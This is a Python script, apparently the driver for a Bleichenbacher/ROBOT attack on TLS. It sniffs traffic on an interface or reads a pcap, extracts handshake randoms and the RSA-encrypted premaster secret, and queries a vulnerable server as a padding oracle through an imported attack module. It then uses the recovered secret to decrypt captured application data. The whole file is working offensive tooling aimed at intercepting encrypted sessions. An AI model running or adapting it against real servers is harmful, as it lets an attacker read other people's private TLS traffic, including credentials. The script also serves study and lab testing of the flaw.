from scapy.all import *
import struct
import binascii 
import sys
from robot_attack import perform_decrypt_attack
import argparse
from decrypt_aes import Decrypt
load_layer("tls")

APP_DATA = 23
HANDSHAKE = 22

parser = argparse.ArgumentParser(description="Bleichenbacher attack")
parser.add_argument("pcap", nargs="?", default="", help="Pcap file to read from")
parser.add_argument("-p", "--port", metavar='int', default=4000, help="TCP port")
parser.add_argument("-host", "--host", default='127.0.0.1', help="Host ip address of vulnereable server")
args = parser.parse_args()

args.port = int(args.port)

class PacketListener:
  def __init__(self):
    self.epms = ""
    self.pms = ""
    self.client_random = ""
    self.server_random = ""
    self.resumption = 0
    self.decrypt = None
    self.cipher = 0x0

  def process_packet(self, packet):
    if (Raw in packet):
      raw = bytes(packet[Raw])
      packet_type = int(raw[0])
      if(packet_type == HANDSHAKE):
        handshake_type = int(raw[5])
        if (handshake_type == 1):
          # ClientHello 
          self.client_random = raw[11:43]
          print("Found ClientHello, random: ", hex(int.from_bytes(self.client_random, "big")))

          if (self.decrypt):
            # If a decrypt object is there already, this is a resumption
            self.resumption = 1
            print("Found session resumption")
        elif (handshake_type == 2):
          # ServerHello 
          self.server_random = raw[11:43]
          self.cipher = int.from_bytes(raw[76:78], "big")

          print("Found ServerHello, random: ", hex(int.from_bytes(self.server_random, "big")))
        elif (handshake_type == 16):
          print("Found Client key exchange")
          length = int.from_bytes(raw[9:11], "big")
          enc_premaster_secret = raw[11:11+length]
          print("Encrypted premaster secret: ", hex(int.from_bytes(enc_premaster_secret, "big")))

          # Performs Bleichenbacher attack
          self.decrypt_premaster_secret(enc_premaster_secret)
      if(packet_type == APP_DATA):
          print("Found application data")
          self.decrypt_app_data(packet, raw)

  def decrypt_premaster_secret(self, enc_premaster_secret):
    dec_premaster_secret_data = perform_decrypt_attack(args.host, args.port, enc_premaster_secret, 5, False)
    
    dec_premaster_secret = int.to_bytes(dec_premaster_secret_data, sys.getsizeof(dec_premaster_secret_data), "big")
    dec_premaster_secret = int.from_bytes(dec_premaster_secret, "big")
    print("Decrypted premaster secret: ", hex(dec_premaster_secret))
    self.decrypt = Decrypt(hex(dec_premaster_secret), self.client_random, self.server_random, self.cipher)

  def decrypt_app_data(self, packet, raw):
    if (not self.decrypt):
      print("No keys to decrypt data!")
      return

    data_length = int.from_bytes(raw[3:5], "big")
    data = int.from_bytes(raw[5:5+data_length], "big")
    print("Encrypted application data: " + hex(data))

    sender = "sever" if packet[TCP].sport == 4000 else "client"
    data = self.decrypt.decrypt_app_data(sender, raw[5:5+data_length], self.resumption, self.client_random, self.server_random)
    print("Decrypted data:\n", data)


if __name__ == "__main__":
  pl = PacketListener()  
  if (args.pcap != ""):
    packets = rdpcap(args.pcap)
    for packet in packets:
      pl.process_packet(packet)
  else:
    sniff(filter="tcp", prn=pl.process_packet, iface="eth0", store=True)

